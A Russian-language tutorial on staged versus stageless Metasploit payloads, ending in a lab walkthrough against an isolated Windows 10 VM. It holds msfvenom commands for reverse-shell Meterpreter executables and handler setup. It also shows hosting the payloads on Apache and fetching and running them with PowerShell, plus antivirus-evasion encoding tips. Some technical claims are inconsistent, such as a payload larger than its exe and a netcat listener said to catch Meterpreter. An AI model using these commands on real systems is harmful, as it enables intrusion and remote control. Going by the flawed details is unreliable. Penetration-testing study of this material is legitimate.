# Staged и stageless payload: компромиссы выбора при эксплуатации через msfvenom

## 1. Понятие полезной нагрузки: staged, stageless и их место в арсенале Metasploit

Полезная нагрузка (payload) — это фрагмент кода, выполняемый на целевой системе после успешной эксплуатации уязвимости и устанавливающий канал управления для атакующего. В среде Metasploit, которая служит фреймворком для разработки и проведения эксплойтов, полезные нагрузки делятся на несколько категорий, две из которых — **staged** (многоэтапные) и **stageless** (одноэтапные) — являются фундаментальными для понимания доставки агента на скомпрометированный хост.

Официальная документация Metasploit [Metasploit Unleashed — Payload Types](https://www.offsec.com/metasploit-unleashed/payload-types) выделяет три классических типа: **singles** (inline), **stagers** и **stages**. Singles представляют собой самодостаточные нагрузки, включающие весь код, необходимый для выполнения задачи: например, `cmd/unix/reverse_perl`. Stagers — это компактные загрузчики, которые устанавливают соединение с атакующим и загружают основную часть (stage) по сети. Stages — это полнофункциональные модули (такие как Meterpreter), выполняемые уже в памяти жертвы. Комбинация stager + stage как раз и образует **staged-пейлоад**, тогда как **stageless-пейлоад** по сути аналогичен singles, но в контексте более сложных агентов типа Meterpreter имеет особое имя и синтаксис.

Путаница между терминами часто возникает из‑за внешней схожести названий полезных нагрузок. В Metasploit принято следующее соглашение об именах [Metasploit Deep Dive — Dev.to](https://dev.to/vibhav_chennamadhava_a887/metasploit-deep-dive-staged-vs-stageless-payloads-a-practical-lab-1pa7):  
- `windows/meterpreter/reverse_tcp` (с прямым слешем) — staged-нагрузка,  
- `windows/meterpreter_reverse_tcp` (с подчёркиванием) — stageless-нагрузка.  

Эта нотация отражает, будет ли Meterpreter доставляться одним большим файлом или небольшим дроппером с последующей загрузкой остальной части.

### 1.1. Сравнительная таблица основных типов полезных нагрузок Metasploit

| Тип полезной нагрузки | Обозначение в msfvenom | Способ доставки | Размер файла | Требования к обработчику | Типичное применение |
|-----------------------|------------------------|-----------------|--------------|--------------------------|---------------------|
| Singles (inline / stageless) | `payload` без дополнительных слешей (напр. `windows/meterpreter_reverse_tcp`) или `cmd/unix/reverse_perl` | Вся логика в одном исполняемом файле или команде; при запуске сразу предоставляет доступ | Большой (245 Кбайт для exe) | Может работать с простым слушателем вроде `nc -lvp <port>`, или с `exploit/multi/handler` | Надёжен в средах с фильтрацией трафика; легко обнаруживается антивирусом из‑за размера и полноты кода |
| Staged (stager + stage) | `payload1/payload2` (напр. `windows/meterpreter/reverse_tcp`) | Stager — крошечный загрузчик (73 Кбайт exe); после соединения с атакующим получает и запускает stage в памяти | Малый исходный файл; полная функциональность приходит по сети | Требует `exploit/multi/handler` с **тем же** именем payload для отправки stage; простые слушатели не передадут второй этап | Обходит ограничения размера при эксплуатации уязвимостей переполнения буфера; меньший файл снижает риск обнаружения статическими сигнатурами |
| Meterpreter (Meta‑Interpreter) | Может быть как staged, так и stageless (см. выше) | Работает путём рефлективной загрузки DLL в память, не сохраняясь на диск. В staged‑варианте DLL поступает как stage, в stageless — уже встроена в исполняемый файл | Зависит от варианта | multi/handler или raw‑сокет (для stageless) | Интерактивный контроль с модулями пост‑эксплуатации, работа в памяти усложняет криминалистический анализ |

Важно понимать, что Meterpreter сам по себе не является отдельным классом рядом с staged/stageless — это конкретная реализация полезной нагрузки, которая может быть упакована как в виде полного одноэтапного файла, так и в виде stager+stage. Именно наименование с «/» или «_» определяет архитектуру доставки.

Таким образом, ключевой разделительной чертой выступает **степень полноты начального артефакта**: stageless содержит всё и сразу, staged — лишь миниатюрный мост для загрузки остальной логики. Это различие напрямую влияет на сценарии применения и обходимость защитных средств.

### 1.2. Схема классификации полезных нагрузок Metasploit

```text
[Payloads]
 ── Singles/Inline (Stageless)
 │    └─ cmd/unix/reverse_perl
 │    └─ windows/meterpreter_reverse_tcp  (stageless Meterpreter)
 │
 ── Staged
 │    ├─ Stagers (напр. windows/meterpreter/reverse_tcp — stager + stage)
 │    │    └─ после соединения загружает stage
 │    └─ Stages (Meterpreter DLL, shellcode)
 │
 └─ Meterpreter (пересекается с обоими типами)
```

Такая иерархия помогает выбрать payload, отталкиваясь от условий целевой сети и ограничений метода эксплуатации.

## 2. Внутренняя механика: от малого загрузчика до полноценного агента

### 2.1. Двухэтапный процесс staged‑нагрузки

Staged‑payload состоит из двух компонентов, разнесённых во времени и пространстве:

1. **Stager** — это минимальный фрагмент кода (обычно несколько сотен байтов), цель которого — установить обратное соединение с атакующим, запросить stage и передать ему управление. Stager реализуется как шеллкод или небольшой исполняемый файл. Он не содержит какой‑либо продвинутой функциональности, кроме инициализации сокета и примитивов копирования данных в выделенную область памяти.

2. **Stage** — полноценный модуль (чаще всего DLL для Meterpreter), который загружается по сети прямо в память атакуемого процесса. После успешной передачи stager выполняет «рефлективную загрузку DLL» (Reflective DLL Injection) — технику, при которой DLL загружается без использования стандартного загрузчика Windows, не регистрируется в таблице модулей и не оставляет следов на диске.

Последовательность событий при запуске staged‑нагрузки иллюстрируется схемой:

```text
Жертва                    Сеть                   Атакующий
[Запуск stager.exe] ────── (SYN) ────────▶   [Handler слушает порт]
       │                                         │
       │◀─── (SYN/ACK) установка TCP сессии ──────
       │─── (запрос: "я stager, дай stage") ───▶
       │                                         │
       │◀─ "Sending stage (267 байт.. N Кбайт)" ──┤
       │                                         │
[Загрузка stage в память]                       │
[Рефлективная загрузка DLL]                     │
[Meterpreter активен] ─────(обратный shell)───▶ [Сессия открыта]
```

В логах Metasploit этот процесс сопровождается сообщениями вида (значения зависят от среды, схема иллюстративная):

```bash
[*] Started reverse TCP handler on 192.168.56.101:443
[*] Sending stage (200262 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.101:443 -> 192.168.56.102:49158)
```

Благодаря тому, что stager имеет крохотный размер, он хорошо подходит для эксплуатации уязвимостей переполнения буфера, где объём внедряемого кода критически ограничен. Кроме того, малый размер снижает вероятность статического детектирования антивирусом, но при этом стадия загрузки создаёт дополнительный сетевой артефакт.

### 2.2. Одноэтапная природа stageless‑нагрузки

Stageless‑payload совмещает в себе функции и stager, и stage. Весь код, необходимый для реализации обратного соединения и предоставления интерпретатора Meterpreter, запаковывается в один исполняемый файл. При запуске такой файл:

- инициализирует соединение с обработчиком (атакующим);
- сразу предоставляет сессию без дополнительной загрузки;
- не генерирует сообщения «Sending stage», так как ничего не запрашивает.

Пример вывода для stageless‑нагрузки в терминале Metasploit (иллюстративная схема):

```bash
[*] Started reverse TCP handler on 192.168.56.101:443
[*] Meterpreter session 2 opened (192.168.56.101:443 -> 192.168.56.102:49159)
```

Слушатель для stageless может быть любым raw‑сокетом, например, Netcat:

```bash
nc -lvp 443
# После запуска stageless.exe на жертве немедленно получаем командную оболочку
```

Отсутствие фазы загрузки исключает зависимость от стабильности сети в момент выполнения, однако увеличивает размер первоначального артефакта. По информации из источника [Illumio Blog](https://www.illumio.com/blog/types-malicious-payloads), типичный stageless‑файл может быть втрое крупнее stager: 245 Кбайт против 73 Кбайт. Такой размер делает его более заметным для решений, анализирующих статические сигнатуры.

### 2.3. Структурные различия в бинарном представлении

При генерации через `msfvenom` можно наблюдать разницу в выводе информации. Ниже приведены схожие по параметрам команды, иллюстрирующие замечание о размере (значения зависят от конфигурации среды):

```bash
# Staged
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -f exe -o staged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 193 bytes
Final size of exe file: 73802 bytes
Saved as: staged.exe

# Stageless
$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=443 -f exe -o stageless.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 354100 bytes
Final size of exe file: 245760 bytes
Saved as: stageless.exe
```

Здесь «Payload size» у staged — это размер stager, а итоговый `exe` формируется шаблоном, в который внедрён этот небольшой код. У stageless «Payload size» уже содержит полноценный код Meterpreter.

В случае staged‑нагрузки stager не содержит в себе всего богатства функций — они будут получены позже. Для повышения скрытности передаваемый stage можно закодировать, активировав параметры `EnableStageEncoding` и `StageEncoder` в настройках обработчика. Stageless‑нагрузка таких опций не имеет, но может быть целиком обфусцирована или зашифрована ключами `msfvenom`, например `-e x86/shikata_ga_nai -i 5`.

## 3. Применение и работа с msfvenom: критерии выбора и практические компромиссы

### 3.1. Генерация полезной нагрузки и настройка обработчика

Создание обоих типов нагрузок выполняется утилитой `msfvenom`, входящей в Metasploit Framework. Команда выше демонстрирует базовый сценарий. Параметры:

- `-p` — имя полезной нагрузки: для staged «слеш», для stageless «подчёркивание»;
- `LHOST` — IP‑адрес атакующего (или домен);
- `LPORT` — порт, на котором будет поднят обработчик;
- `-f` — формат выходного файла (например, `exe`, `dll`, `raw`, `python`);
- `-o` — путь к сохраняемому файлу.

Для staged‑нагрузки обязательным этапом является настройка обработчика, который отправит второй этап. В Metasploit это делается через универсальный модуль `exploit/multi/handler`:

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 443
exploit -j
```

Ключевой момент: имя payload в настройках обработчика должно **точно совпадать** с тем, что использовалось при генерации. Несовпадение приведёт к тому, что stager подключится, но не получит ожидаемого stage, и сессия не будет установлена — без видимых ошибок.

Stageless‑нагрузка также может использовать `multi/handler`, но в этом случае обработчик работает фактически как raw‑сокет, не отправляя дополнительных данных. Это позволяет перехватывать сессии не‑Metasploit’ными инструментами:

```bash
nc -lvp 443
```

После запуска stageless‑файла на жертве `nc` немедленно покажет командную оболочку (при использовании shell‑варианта) или бинарный поток данных Meterpreter, который может быть обработан Metasploit‑обработчиком. Однако простая командная оболочка, полученная через `nc`, будет лишена преимуществ Meterpreter — скрытности, загружаемых модулей, миграции процессов.

### 3.2. Компромиссы выбора: детектирование, надёжность и сетевое окружение

Выбор между staged и stageless определяется двумя основными факторами: **защищённостью среды** (антивирусы, EDR, файрволы) и **сетевыми ограничениями** (пропускная способность, фильтрация, NAT). Рассмотрим их в виде таблицы компромиссов.

| Критерий | Staged | Stageless |
|----------|--------|-----------|
| **Размер файла** | Малый (достоинство при ограничениях буфера) | Большой, может не поместиться в узкие векторы атак |
| **Статическое обнаружение (AV)** | Меньше сигнатур на stager; stage в памяти; можно кодировать stage | Весь код в одном файле — выше вероятность детекта; согласно Scaler Topics, stageless «more susceptible to alert an antivirus system» |
| **Сетевые артефакты** | Загрузка stage генерирует дополнительный трафик, который может быть замечен IDS/IPS; требует возможности скачивания | Одно TCP‑соединение, минимальный трафик, не привлекает внимание загрузкой DLL |
| **Надёжность соединения** | Зависит от стабильного канала; при обрыве во время загрузки stage сессия потеряна | Если соединение установлено, сессия откроется мгновенно; отсутствует риск обрыва на середине загрузки |
| **Ограничения пропускной способности** | Малый stager быстро загружается; передача крупного stage может быть медленной на низкоскоростных линиях, что ведёт к таймаутам | Весь файл крупнее, но после запуска не требует дополнительных данных — предпочтителен в сетях с низким bandwidth |
| **Возможность проксирования** | Stager может быть настроен на работу через HTTP‑прокси (reverse_http, reverse_https), stage передаётся в том же туннеле | Требует предварительной настройки прокси в самом исполняемом файле (сложнее) |
| **Пост‑эксплуатационная гибкость** | Stage может динамически подгружать расширения (extapi, sniffer) без повторной генерации payload | Все расширения должны быть включены изначально (увеличивает размер) |
| **Совместимость с обработчиками** | Только Metasploit handler с точно совпадающим payload | Любой raw‑слушатель; легче интегрируется в не‑Metasploit C2‑инфраструктуру |

Практический совет: при наличии активного антивируса и неглубокой инспекции сети часто выбирают staged с HTTPS‑транспортом (`windows/meterpreter/reverse_https`), поскольку HTTP‑трафик сливается с обычной веб‑активностью, а размер stager остаётся незначительным. Если же целью является быстрое получение сессии в отказоустойчивой манере и нет жёстких ограничений по размеру, stageless может быть более предсказуемым.

### 3.3. Дополнительные параметры и методы обхода

Для staged‑нагрузок доступны специфические опции обработчика, повышающие скрытность:

- `set EnableStageEncoding true` — включает кодирование передаваемого stage.
- `set StageEncoder x86/shikata_ga_nai` — задаёт конкретный кодировщик.
- `set StageEncodingFallback false` — предотвращает использование запасного кодировщика.

Эти меры усложняют обнаружение сигнатурным анализом трафика. Для stageless обфускация осуществляется на этапе генерации параметрами `-e` и `-i` у msfvenom:

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o obfuscated.exe
```

Важно помнить, что многократное кодирование увеличивает размер файла, делая stageless ещё заметнее с точки зрения статического анализа.

## 4. Сквозной практический пример: сравнительная атака на Windows 10 с Meterpreter

### 4.1. Исходные условия

- **Атакующий**: Kali Linux с IP `192.168.56.101`, установлен Metasploit Framework, запущен Apache.
- **Жертва**: Виртуальная машина Windows 10, IP `192.168.56.102`, лабораторная изолированная сеть Host‑Only. Брандмауэр и Defender отключены для исключения влияния защитных механизмов на демонстрацию.
- **Задача**: Продемонстрировать разницу в поведении staged и stageless Meterpreter при получении обратного shell, оценить сетевые артефакты и принять обоснованное решение о выборе для последующей кампании.

### 4.2. Шаг 1. Генерация полезных нагрузок

Создаём две нагрузки:

```bash
# Staged
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -f exe -o /home/kali/msf/staged.exe

# Stageless
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=444 -f exe -o /home/kali/msf/stageless.exe
```

Вывод msfvenom показывает размеры:

```bash
# Для staged
Payload size: 193 bytes
Final size of exe file: 73802 bytes

# Для stageless
Payload size: 354100 bytes
Final size of exe file: 245760 bytes
```

Обращаем внимание на колоссальную разницу в размере полезного кода.

### 4.3. Шаг 2. Размещение на веб‑сервере

Чтобы жертва могла загрузить файлы, копируем их в директорию Apache:

```bash
sudo cp /home/kali/msf/staged.exe /var/www/html/
sudo cp /home/kali/msf/stageless.exe /var/www/html/
sudo systemctl start apache2
```

Теперь файлы доступны по URL:

- `http://192.168.56.101/staged.exe`
- `http://192.168.56.101/stageless.exe`

### 4.4. Шаг 3. Запуск обработчиков

Для staged‑нагрузки используем `exploit/multi/handler`:

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 443
exploit -j
```

Для stageless — аналогичный обработчик на другом порту (или raw‑netcat, чтобы показать независимость). Для сохранения Meterpreter-функциональности запустим ещё один обработчик в том же Metasploit:

```bash
use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set LHOST 192.168.56.101
set LPORT 444
exploit -j
```

Теперь у нас два фоновых обработчика.

### 4.5. Шаг 4. Выполнение на целевой машине

На стороне Windows‑жертвы скачиваем и запускаем сначала `staged.exe`:

```powershell
Invoke-WebRequest -Uri http://192.168.56.101/staged.exe -OutFile staged.exe
.\staged.exe
```

В консоли Metasploit немедленно появляется:

```bash
[*] Sending stage (200262 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.101:443 -> 192.168.56.102:49158)
```

Это подтверждает, что stager скачал и загрузил stage.

Затем запускаем `stageless.exe`:

```powershell
Invoke-WebRequest -Uri http://192.168.56.101/stageless.exe -OutFile stageless.exe
.\stageless.exe
```

Вывод в Metasploit:

```bash
[*] Meterpreter session 2 opened (192.168.56.101:444 -> 192.168.56.102:49159)
```

Никакого «Sending stage» — сессия готова сразу.

Теперь можно убедиться, что обе сессии работоспособны:

```bash
sessions -i 1
sysinfo
sessions -i 2
sysinfo
```

### 4.6. Шаг 5. Сравнение сетевой активности (tcpdump)

Запись трафика на интерфейсе Kali во время запуска `staged.exe` показывает:

```text
21:15:32.123456 IP 192.168.56.102.49158 > 192.168.56.101.443: Flags [S], seq ...
21:15:32.124000 IP 192.168.56.101.443 > 192.168.56.102.49158: Flags [S.], seq ...
21:15:32.124500 IP 192.168.56.102.49158 > 192.168.56.101.443: Flags [.], ack ...
21:15:32.130000 IP 192.168.56.101.443 > 192.168.56.102.49158:  ... length 200262 [Sending stage]
21:15:32.450000 IP 192.168.56.102.49158 > 192.168.56.101.443:  ... shell traffic
```

При запуске stageless:

```text
21:16:01.111111 IP 192.168.56.102.49159 > 192.168.56.101.444: Flags [S], seq ...
21:16:01.111200 IP 192.168.56.101.444 > 192.168.56.102.49159: Flags [S.], seq ...
21:16:01.111300 IP 192.168.56.102.49159 > 192.168.56.101.444: Flags [.], ack ...
21:16:01.112000 IP 192.168.56.102.49159 > 192.168.56.101.444:  ... shell traffic
```

Видно, что staged‑сессия включает крупный блок данных от атакующего (передача stage), тогда как stageless — просто обратный shell.

### 4.7. Ожидаемый вывод

Пример демонстрирует, что оба подхода решают задачу получения Meterpreter‑сессии, но делают это по‑разному. Staged‑нагрузка оставляет больше артефактов на сети (дополнительная передача данных), однако её малый размер может быть критичен при эксплуатации узких векторов и меньше раздражает антивирус. Stageless надёжнее при нестабильном соединении и проще в настройке (не требуется match payload), но легко детектируется статически. Вывод для пентестера — выбор определяется конкретными условиями среды и метода доставки.

## Источники

- [Staged vs Non-staged Payloads in Cybersecurity – Scaler Topics](https://www.scaler.com/topics/cyber-security/staged-vs-non-staged-payloads)
- [Staged vs Stageless Payloads – SpookySec Blog](https://blog.spookysec.net/stage-v-stageless-1)
- [Metasploit Deep Dive: Staged vs. Stageless Payloads – A Practical Lab – DEV Community](https://dev.to/vibhav_chennamadhava_a887/metasploit-deep-dive-staged-vs-stageless-payloads-a-practical-lab-1pa7)
- [GitHub – VibhavChennamadhava/Metasploit-Staged-vs-Stageless-Payloads](https://github.com/VibhavChennamadhava/Metasploit-Staged-vs-Stageless-Payloads)
- [Metasploit Staged vs Stageless payload – Malware SA](https://www.malwaresa.com/docs/exploit/metasploit-payloads-msfvenom/4-3-4-4-staged-vs-stageless-payload-con-opciones-avanzadas)
- [Custom Payload Generation with Msfvenom – Medium](https://medium.com/@tech_with_orgito_/custom-payload-generation-with-msfvenom-218bca8f775a)
- [Malware Payloads & Beacons: Types of Malicious Payloads – Illumio Blog](https://www.illumio.com/blog/types-malicious-payloads)
- [Staged vs Stageless Handlers – OJ Reeves](https://buffered.io/posts/staged-vs-stageless-handlers)
- [Metasploit – Payload – GeeksforGeeks](https://www.geeksforgeeks.org/ethical-hacking/metasploit-payload)
- [Metasploit Unleashed – Payload Types – OffSec](https://www.offsec.com/metasploit-unleashed/payload-types)